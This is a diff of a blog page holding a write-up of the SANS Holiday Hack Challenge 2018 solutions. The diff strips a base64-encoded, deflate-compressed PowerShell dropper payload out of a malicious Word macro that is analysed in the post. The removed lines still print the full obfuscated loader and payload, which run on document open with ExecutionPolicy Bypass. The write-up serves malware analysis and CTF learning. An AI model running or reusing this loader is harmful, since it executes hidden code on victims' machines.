@@ -10,7 +10,7 @@
 <meta name=description content>
 <meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]">
 <meta name=author content="Parsia">
-<meta name=generator content="Hugo 0.92.0">
+<meta name=generator content="Hugo 0.92.1">
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image:src content="https://parsiya.net/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/01-bloodhound.png">
 <meta name=twitter:title content="SANS Holiday Hack Challenge 2018 Solutions">
@@ -54,7 +54,7 @@ complete unless it is known by its causes. - Avicenna</h2>
 <article class=hentry role=article>
 <header>
 <p class=meta>Jan 15, 2019
-- 28 minute read
+- 29 minute read
 - <a href=https://parsiya.net/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/#disqus_thread>Comments</a>
 - <a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/crypto/>Crypto </a><a class=label href=https://parsiya.net/categories/reverse-engineering/>Reverse Engineering </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack </a>
 </p>
@@ -357,7 +357,7 @@ http {
 </h1><p><strong>The answer is <code>19880715</code>.</strong></p>
 <h2 id=scan-o-matic>scan-o-matic
 <a class=header-link href=#scan-o-matic><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h2><p>To get into the room we need to upload a QRcode with the payload to do SQLi.</p>
+</h2><p>To get into the room we need to upload a QR code with the payload to do SQLi.</p>
 <p>The request looks like:</p>
 <pre tabindex=0><code>POST /upload HTTP/1.1
 Host: scanomatic.kringlecastle.com
@@ -834,7 +834,11 @@ alert udp any 53 -&gt; any any (msg:&quot;malware DNS response&quot;;sid:1000000
 <p>We have already seen the domain in Wireshark, it's <code>erohetfanu.com</code>.</p>
 <h3 id=dropper-analysis>Dropper Analysis
 <a class=header-link href=#dropper-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
-</h3><p>There's a zip file with a <code>docm</code> in it. Password is <code>elves</code>.</p>
+</h3><p><strong>Update 2022-02-07</strong>: Windows Defender keeps deleting this file because it
+detects a trojan. This is likely because this dropper code. I am tired of
+reverting this. So I am gonna remove parts of this section to figure out which
+part is the culprit. The cleaned up PowerShell script is on GitHub.</p>
+<p>There's a zip file with a <code>docm</code> in it. Password is <code>elves</code>.</p>
 <ul>
 <li><a href=https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip target=_blank rel="noreferrer noopener">https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip</a></li>
 </ul>
@@ -876,7 +880,7 @@ in file: word<span style=color:#719e07>/</span>vbaProject<span style=color:#719e
 <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span>
 Private Sub Document_Open()
 Dim cmd As String
-cmd <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &#34;&#34;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&#34;&#34; &#34;</span>
+cmd <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &#34;&#34;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;[removed-because-of-windows-defender]&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&#34;&#34; &#34;</span>
 Shell cmd
 End Sub
 
@@ -886,11 +890,11 @@ in file: word<span style=color:#719e07>/</span>vbaProject<span style=color:#719e
 <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span> <span style=color:#719e07>-</span>
 Sub AutoOpen()
 Dim cmd As String
-cmd <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &#34;&#34;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&#34;&#34; &#34;</span>
+cmd <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &#34;&#34;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;[removed-because-of-windows-defender]&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&#34;&#34; &#34;</span>
 Shell cmd
 End Sub
-</code></pre></div><p>Seems like the Powershell payload is base64 encoded and then compressed.</p>
-<p>Cyberchef to the rescue with these filters:</p>
+</code></pre></div><p>Seems like the PowerShell payload is base64 encoded and then compressed.</p>
+<p>CyberChef to the rescue with these filters:</p>
 <pre tabindex=0><code>From_Base64('A-Za-z0-9+/=',true)
 Raw_Inflate(0,0,'Adaptive',false,false)
 Generic_Code_Beautify()
